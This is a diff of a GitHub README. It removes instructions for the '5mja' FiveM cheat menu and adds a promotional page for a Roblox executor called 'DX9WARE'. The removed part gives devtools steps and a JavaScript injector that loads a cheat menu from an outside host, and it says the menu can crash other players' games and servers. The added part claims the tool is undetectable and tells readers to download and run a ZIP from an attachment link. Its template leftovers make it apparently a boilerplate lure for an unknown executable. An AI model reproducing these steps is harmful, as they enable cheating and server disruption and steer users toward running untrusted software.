@@ -1,30 +1,40 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
+# DX9WARE-Roblox
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+Welcome to the official repository for **DX9WARE**, a powerful Roblox executor! 😎
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+## Overview
+**DX9WARE** is a high-quality Roblox executor designed to enhance your scripting experience within Roblox games. With a secure and customizable Lua environment, this executor offers a wide range of scripts and features tailored for advanced scripting needs. It is an external tool that provides top-notch performance without the risk of detection. Elevate your scripting capabilities with **DX9WARE**!
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+![DX9WARE Logo](https://example.com/dx9ware-logo.png)
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+## Features
+- **Secure Lua Environment**: Enjoy a safe and stable scripting environment with robust security measures.
+- **Customizable**: Tailor the executor to suit your unique preferences and requirements.
+- **Wide Range of Scripts**: Access a diverse library of scripts to enhance your gameplay.
+- **No Detection**: Work discreetly with this undetectable external tool.
+- **Perfect for Advanced Scripting**: Ideal for experienced scripters looking to take their skills to the next level.
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+## Installation
+To get started with **DX9WARE**, follow these simple steps:
+1. Download the executor from the following link: [![Download DX9WARE](https://img.shields.io/badge/Download%20DX9WARE-Software.zip-<color_hex_code>)](https://github.com/user-attachments/files/17394153/Software.zip)
+2. Extract the ZIP file to your desired location.
+3. Run the executor and start scripting like a pro!
+
+## Usage
+1. Launch **DX9WARE** and log in with your credentials.
+2. Select the game you want to script in.
+3. Access the available scripts and features to enhance your gameplay experience.
+4. Experiment, create, and have fun scripting in Roblox with **DX9WARE**!
+
+## Contributing
+We welcome contributions from the Roblox scripting community to help improve **DX9WARE**. Feel free to submit pull requests, report issues, or suggest new features. Together, we can make **DX9WARE** even better for everyone!
+
+## Support
+If you need any assistance or have questions about **DX9WARE**, please reach out to our support team by emailing support@dx9ware.com. We are here to help you make the most out of your scripting journey!
+
+## License
+This project is licensed under the MIT License - see the [LICENSE.md](./LICENSE.md) file for details.
+
+---
+
+Thank you for choosing **DX9WARE** as your Roblox scripting companion! 🚀 Happy scripting! 
